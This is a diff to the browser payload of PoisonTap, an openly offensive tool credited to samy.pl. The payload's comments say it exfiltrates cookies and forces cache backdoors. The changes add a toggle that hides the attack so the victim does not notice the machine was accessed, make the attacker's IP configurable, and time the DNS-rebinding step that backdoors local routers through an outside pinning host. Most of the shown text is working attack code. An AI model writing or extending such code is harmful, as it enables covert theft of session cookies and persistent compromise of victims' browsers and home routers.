@@ -16,6 +16,15 @@ Welcome to <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonT
 // DO NOT DELETE THE '*/' line above //
 
 // CONFIGURATION
+// Display PoisonTap animation OR stay entirely hidden
+// If you don't want it to be obvious the machine was
+// accessed, DISABLE THIS! However, this is good for
+// testing to verify it is in fact operational.
+var displayAnimation = 1;
+
+// PoisonTap's IP address (set up in network config)
+var ptIp = '1.0.0.1';
+
 // Whether we want to use image tags or iframes to
 // exfiltrate cookies and force cache backdoors.
 // Images are faster but may have some caching limitations
@@ -66,11 +75,14 @@ function addImg(host)
 function backdoorRouters()
 {
   // pin the poisontap IP
-  addImg('1.0.0.1.pin.ip.samy.pl'); // this is meant to pin 192.168.0.1 to 1.0.0.1
+  addImg(ptIp + '.pin' + dnsPinServer); // this is meant to pin 192.168.0.1 to 1.0.0.1
 
-  var routers = getRouters();
-  for (var i in routers)
-    addIframe(routers[i] + '.ip.samy.pl');
+  // give the pinned resolver a moment to update
+  setTimeout(function() {
+    var routers = getRouters();
+    for (var i in routers)
+      addIframe(routers[i] + dnsPinServer);
+  }, 500);
 }
 
 function backdoorAlexaSites()
@@ -88,33 +100,36 @@ function backdoorAlexaSites()
   }
 }
 
-var w = window.parent;
-var d = w.document;
-var divid = '__poisontap';
-if (!d.getElementById(divid))
+if (displayAnimation)
 {
-  // if you want poisontap to start up immediatele, make sure next line is uncommented
-  ptcanvas();
+  var w = window.parent;
+  var d = w.document;
+  var divid = '__poisontap';
+  if (!d.getElementById(divid))
+  {
+    // if you want poisontap to start up immediateley, make sure next line is uncommented
+    ptcanvas();
 
-	var div = d.createElement('div');
-	div.id = divid;
-	var a = d.createElement('a');
-  a.href = 'https://samy.pl';
-  a.target = '_blank';
-/*	a.href = '#';
-	a.onclick = function() {
-		ptcanvas();
-		return false;
-	};
-  */
-  a.style.color = '#E30B5D'; // raspberry-colored pi symbol
-	a.innerHTML = '&#960'; // mm, pi
-  a.style.fontSize = '40px';
-	div.appendChild(a);
-	div.style.position = 'fixed';
-	div.style.bottom = '5px';
-	div.style.right = '10px';
-	d.body.appendChild(div);
+    var div = d.createElement('div');
+    div.id = divid;
+    var a = d.createElement('a');
+    a.href = 'https://samy.pl';
+    a.target = '_blank';
+    /*	a.href = '#';
+        a.onclick = function() {
+        ptcanvas();
+        return false;
+        };
+     */
+    a.style.color = '#E30B5D'; // raspberry-colored pi symbol
+    a.innerHTML = '&#960'; // mm, pi
+    a.style.fontSize = '40px';
+    div.appendChild(a);
+    div.style.position = 'fixed';
+    div.style.bottom = '5px';
+    div.style.right = '10px';
+    d.body.appendChild(div);
+  }
 }
 
 function ltext()
